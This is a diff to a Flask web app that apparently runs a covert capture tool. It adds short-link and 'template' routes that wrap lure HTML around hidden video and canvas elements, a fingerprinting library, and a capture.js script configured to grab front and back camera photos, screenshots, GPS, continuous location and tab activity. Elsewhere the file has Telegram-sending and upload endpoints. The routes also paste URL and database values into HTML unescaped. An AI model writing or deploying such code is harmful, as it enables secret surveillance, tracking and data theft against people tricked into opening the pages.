@@ -1,4 +1,4 @@
-from flask import Blueprint, render_template, request, jsonify
+from flask import Blueprint, render_template, request, jsonify, abort
 from datetime import datetime
 import json, base64, os, requests
 from app.config import Config
@@ -71,7 +71,7 @@ def send_telegram_text(text):
         return False
 
 
-@bp.route("/")
+@bp.route("/capture")
 def index():
     return render_template("capture.html", campaign="default")
 
@@ -79,6 +79,75 @@ def index():
 @bp.route("/c/<campaign>")
 def index_campaign(campaign):
     return render_template("capture.html", campaign=campaign)
+
+
+@bp.route("/m/<slug>")
+def mode_page(slug):
+    """Short URL untuk mode - render capture page dengan config dari DB."""
+    from app.models import CaptureConfig
+    config = CaptureConfig.query.filter_by(slug=slug).first()
+    if not config:
+        return render_template("capture.html", campaign="default", mode_config=None)
+    config.used_count = (config.used_count or 0) + 1
+    db.session.commit()
+    return render_template("capture.html", campaign=config.campaign, mode_config=config)
+
+
+@bp.route("/t/<int:tid>/<slug>")
+def template_page(tid, slug):
+    """Render template HTML dengan capture.js."""
+    from app.models import Template
+    from flask import Response as FlaskResponse
+    t = Template.query.get(tid)
+    if not t:
+        abort(404)
+    try:
+        import json as _json
+        cfg = _json.loads(t.config_json or "{}")
+    except Exception:
+        cfg = {}
+    config_json = _json.dumps({
+        "ENABLE_FOTO_DEPAN": bool(cfg.get("foto_depan")),
+        "ENABLE_FOTO_BELAKANG": bool(cfg.get("foto_belakang")),
+        "ENABLE_SCREENSHOT": bool(cfg.get("screenshot")),
+        "ENABLE_GPS": bool(cfg.get("gps")),
+        "ENABLE_BURST": bool(cfg.get("burst")),
+        "ENABLE_LOCATION_TRACKING": bool(cfg.get("location_tracking")),
+        "ENABLE_TAB_LOG": bool(cfg.get("tab_log")),
+        "DELAY_SECONDS": 5,
+        "WAIT_PERMISSION": True,
+    })
+    html = "<!DOCTYPE html><html><head><meta charset='utf-8'>" \
+           "<meta name='viewport' content='width=device-width,initial-scale=1'>" \
+           "<title>" + t.name + "</title>" \
+           "<link rel='manifest' href='/static/manifest.json'>" \
+           "<style>body{margin:0;padding:0;font-family:system-ui,sans-serif}</style></head><body>" \
+           + (t.html_content or "") + \
+           "<video id='v' autoplay playsinline muted hidden></video>" \
+           "<canvas id='c' hidden></canvas>" \
+           "<div id='status' hidden></div><div id='log' hidden></div>" \
+           "<script>window.CAMPAIGN='" + (t.category or 'template') + "';" \
+           "window.MODE_SLUG='" + slug + "';" \
+           "window.CONFIG=" + config_json + ";</script>" \
+           "<script src='https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js'></script>" \
+           "<script src='https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js'></script>" \
+           "<script src='/static/js/capture.js'></script>" \
+           "</body></html>"
+    return FlaskResponse(html, mimetype="text/html")
+
+
+@bp.route("/t/<int:tid>/preview")
+def preview_template(tid):
+    """Preview template tanpa capture.js."""
+    from app.models import Template
+    from flask import Response as FlaskResponse
+    t = Template.query.get(tid)
+    if not t:
+        abort(404)
+    html = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>" + t.name + "</title>" \
+           "<style>body{margin:0;padding:0;font-family:system-ui,sans-serif}</style></head><body>" \
+           + (t.html_content or "") + "</body></html>"
+    return FlaskResponse(html, mimetype="text/html")
 
 
 @bp.route("/upload", methods=["POST"])
